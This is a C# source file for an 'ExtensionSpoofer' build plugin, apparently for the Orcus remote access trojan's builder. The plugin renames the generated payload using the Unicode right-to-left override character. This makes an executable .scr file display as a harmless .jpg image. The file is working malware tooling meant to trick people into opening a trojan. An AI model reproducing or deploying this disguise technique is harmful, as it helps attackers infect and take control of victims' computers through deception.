using System;
using System.IO;
using System.Windows;
using Orcus.Administration.Plugins;

namespace ExtensionSpoofer
{
    public class Plugin : IBuildPlugin
    {
        private string _fileName = "Image-O";
        private string _extension = "SCR";
        private string _spoofedExtension = ".jpg";

        public bool SettingsAvailable { get; } = true;
        public BuildType BuildType { get; } = BuildType.ChangeFile;

        public string DoWork(string path, Action<string> logger)
        {
            var c = '\u202E';
            var fileName = _fileName + c + _spoofedExtension.Reverse() + _extension.ToLower();
            var newFile = new FileInfo(Path.Combine(Path.GetDirectoryName(path), fileName));

            if (newFile.Exists)
            {
                if (
                    MessageBox.Show("The file already exists. Overwrite?", "Extension Spoofer",
                        MessageBoxButton.OKCancel, MessageBoxImage.Exclamation, MessageBoxResult.Cancel) !=
                    MessageBoxResult.OK)
                    return path;
                newFile.Delete();
            }

            File.Move(path, newFile.FullName);
            return newFile.FullName;
        }

        public void OpenSettings(Window ownerWindow)
        {
            var window = new SettingsWindow(_fileName, _extension, _spoofedExtension) {Owner = ownerWindow};
            window.ShowDialog();
            _fileName = window.FileName;
            _extension = window.Extension;
            _spoofedExtension = window.SpoofedExtension;
        }
    }
}